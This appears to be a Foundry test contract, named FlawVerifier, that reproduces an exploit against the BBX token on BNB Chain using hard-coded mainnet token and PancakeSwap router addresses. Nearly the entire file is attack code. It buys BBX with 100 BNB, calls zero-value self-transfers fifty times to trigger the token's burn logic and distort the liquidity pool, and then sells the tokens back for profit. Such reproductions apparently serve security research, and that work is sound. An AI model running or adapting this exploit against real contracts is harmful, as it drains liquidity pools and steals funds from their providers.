 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IBBX is IERC20 {
    function lastBurnTime() external view returns (uint256);
    function lastBurnGapTime() external view returns (uint256);
}

interface IRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract FlawVerifier is Test {
    address internal constant BBX = 0x67Ca347e7B9387af4E81c36cCA4eAF080dcB33E9;
    address internal constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function executeOnOpportunity() public {
        IBBX token = IBBX(BBX);
        IRouter router = IRouter(ROUTER);

        console.log("--- DEBUG INFO ---");
        console.log("Current Timestamp:", block.timestamp);
        
        uint256 lastTime = 0;
        uint256 gapTime = 0;

        try token.lastBurnTime() returns (uint256 t) {
            lastTime = t;
            console.log("Last Burn Time:   ", t);
        } catch { console.log("Failed to get lastBurnTime"); }
        
        try token.lastBurnGapTime() returns (uint256 t) {
            gapTime = t;
            console.log("Last Burn Gap Time:", t);
        } catch { console.log("Failed to get lastBurnGapTime"); }
        
        uint256 targetTime = lastTime + gapTime;
        console.log("Target Time:      ", targetTime);
        
        if (targetTime > block.timestamp) {
            console.log("Time remaining:   ", targetTime - block.timestamp);
        } else {
            console.log("Condition MET!");
        }
        console.log("------------------");

        // Attempt exploit logic if condition is met or just to try
        // 1. Buy BBX
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = BBX;

        uint256 bnbAmount = 100 ether; // Use some BNB
        console.log("Swapping 100 BNB for BBX...");
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: bnbAmount}(
            0,
            path,
            address(this),
            block.timestamp + 100
        );

        uint256 balance = token.balanceOf(address(this));
        console.log("BBX Balance after swap:", balance);

        // 2. Trigger burn loop
        console.log("Starting transfer loop...");
        for(uint i=0; i<50; i++) {
            token.transfer(address(this), 0);
        }

        // 3. Sell BBX
        token.approve(ROUTER, type(uint256).max);
        path[0] = BBX;
        path[1] = WBNB;

        balance = token.balanceOf(address(this));
        console.log("Selling BBX...", balance);
        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance,
            0,
            path,
            address(this),
            block.timestamp + 100
        ) {
            console.log("Sell successful");
        } catch Error(string memory reason) {
            console.log("Sell failed:", reason);
        } catch {
            console.log("Sell failed (unknown)");
        }
    }
}